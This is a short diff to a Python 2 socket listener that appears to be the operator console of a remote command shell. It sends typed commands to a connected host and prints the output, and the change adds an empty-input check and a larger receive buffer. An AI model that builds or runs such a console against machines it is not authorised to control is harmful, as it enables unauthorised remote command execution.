@@ -42,15 +42,18 @@ def socketAccept():
         print ('Socket Accepting error: ' + str(msg[0]))
 def menu():
     while 1:
-        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
+        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ') or 'bigboi'
         if cmd == 'quit':
             conn.send(cmd)
             conn.close()
             s.close()
             sys.exit()
-        print (cmd)
-        conn.send(cmd)
-        print(conn.recv(16834))
+        if cmd == 'bigboi':
+            print ("You must type some command")
+        else:
+            print (cmd)
+            conn.send(cmd)
+            print(conn.recv(640834))
 
 def main():
     socketCreate()
@@ -58,5 +61,3 @@ def main():
     socketAccept()
 
 main()
-
-
